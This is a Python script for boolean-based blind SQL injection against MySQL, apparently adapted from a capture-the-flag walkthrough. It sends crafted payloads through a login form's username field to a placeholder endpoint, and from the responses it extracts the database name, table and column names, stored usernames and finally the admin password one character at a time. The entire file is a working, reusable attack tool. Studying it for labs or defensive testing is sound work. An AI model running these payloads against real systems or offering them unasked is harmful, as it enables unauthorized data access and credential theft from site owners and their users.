# MySQL boolean injection
# Mod from https://medium.com/@sananqasim240/monitorsthree-htb-walkthrough-a0d8e0b78acd

import string
import requests


URL = 'URL_ENDPOINT'
CHARSET = "," + string.ascii_letters + string.digits + "_"
SUCCESS = 'Successfully sent password' # Replace this with your success request string

def get_count(payload: str) -> int:
    '''
    Get table count
    PAYLOAD = "admin' AND IF((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema = DATABASE()) = {}, 1, 0) -- -"
    
    Get column count
    - Replace table_name
    PAYLOAD = "admin' AND IF((SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users' AND table_schema = DATABASE()) = {}, 1, 0) -- -"
    '''
    i = 0
    with requests.Session() as session:
        while True:
            resp = session.post(URL, data={'username': payload.format(i)})
            if SUCCESS in resp.text:
                print(f"Total items found: {i}")
                break
            i += 1
    
    return i

def get_name(payload: str) -> None:
    '''
    Note: SQL substring index starts with 1

    Get DB name
    PAYLOAD = "admin' AND SUBSTR(DATABASE(), {}, 1)='{}' -- -"
    e.g. admin' AND SUBSTR(DATABASE(), 1, 1)='m' -- -
    '''
    name = ''
    with requests.Session() as session:
        while True:
            for char in CHARSET:
                name_i = len(name)
                resp = session.post(URL, data={'username': payload.format(name_i + 1, char)}) # name_i + 1 so it always find the next unknown string
                print(f'\r[{name_i}] {name}{char}', end='')
                if SUCCESS in resp.text:
                    name += char
                    break
            else:
                break

        print(f'\rstrlen = {name_i}, str = {name} | {char}')

def get_names(payload: str, tcount: int) -> None:
    '''
    Note: SQL substring index starts with 1

    Get all table name from DB
    
    PAYLOAD = "admin' AND SUBSTR((SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT {},1), {}, 1)='{}' -- -"
    
    Get all column name from table
    - Replace table_name
    PAYLOAD = "admin' AND SUBSTR((SELECT column_name FROM information_schema.columns WHERE table_name='users' AND table_schema=DATABASE() LIMIT {},1), {}, 1)='{}' -- -"
    '''
    if tcount <= 0 or tcount == None:
        print("tcount is < 0 or None")
        return "Error"

    name = ''
    with requests.Session() as session:
        for i in range(tcount):
            while True:
                for char in CHARSET:
                    name_i = len(name)
                    resp = session.post(URL, data={'username': payload.format(i, name_i + 1, char)}) # name_i + 1 so it always find the next unknown string
                    print(f'\r[{name_i}] {name}{char}', end='')
                    if SUCCESS in resp.text:
                        name += char
                        break
                else:
                    break

            print(f'\rIteration {i}: strlen = {name_i}, str = {name} | {char}')
            name = ''

# Get database name
PAYLOAD = "admin' AND SUBSTR(DATABASE(), {}, 1)='{}' -- -"
get_name(PAYLOAD)

# Get all table_name data from the database
PAYLOAD = "admin' AND IF((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema = DATABASE()) = {}, 1, 0) -- -"
table_count = get_count(PAYLOAD)
PAYLOAD = "admin' AND SUBSTR((SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT {},1), {}, 1)='{}' -- -"
get_names(PAYLOAD, table_count)

# Get all column_name from table users
PAYLOAD = "admin' AND IF((SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users' AND table_schema = DATABASE()) = {}, 1, 0) -- -"
col_count = get_count(PAYLOAD)
PAYLOAD = "admin' AND SUBSTR((SELECT column_name FROM information_schema.columns WHERE table_name='users' AND table_schema=DATABASE() LIMIT {},1), {}, 1)='{}' -- -"
get_names(PAYLOAD, col_count)

# Get all column username data from users table
PAYLOAD = "admin' AND IF((SELECT COUNT(*) FROM users) = {}, 1, 0) -- -" # table name = users
user_count = get_count(PAYLOAD)
PAYLOAD = "admin' AND SUBSTR((SELECT username FROM users LIMIT {},1), {}, 1)='{}' -- -" # table name = users
get_names(PAYLOAD, user_count)

# Once get the column and table info, you may create other payload like getting password from a user etc.
# Get admin password
PAYLOAD = "admin' AND SUBSTR(password,{},1)='{}' -- -" # Get password field for admin row since username=admin
get_name(PAYLOAD)
